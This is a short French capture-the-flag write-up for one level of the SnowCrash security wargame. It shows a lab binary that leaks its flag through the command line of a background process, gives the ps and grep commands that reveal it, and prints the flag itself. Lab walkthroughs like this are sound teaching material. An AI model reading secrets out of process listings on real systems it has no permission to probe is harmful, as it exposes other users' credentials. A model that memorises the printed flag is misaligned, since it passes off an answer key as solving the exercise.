# Level 01 → Level 02

**Mot de passe du niveau :** flag de `level00`

## Cible
`/opt/snowcrash/level01/gargoyle`

## Vulnérabilité
Le binaire est un démon : lancé avec un argument (sinon il crashe), il lance
en arrière-plan un processus tournant sous l'utilisateur `flag01` dont la ligne
de commande contient le flag.

## Exploitation
```bash
/opt/snowcrash/level01/gargoyle dontcrash
ps aux | grep flag01
```
Le flag apparaît directement dans la table des processus (`ps aux`).

## Flag
```
kooda7puivaav1idi4f57q8iq0
```
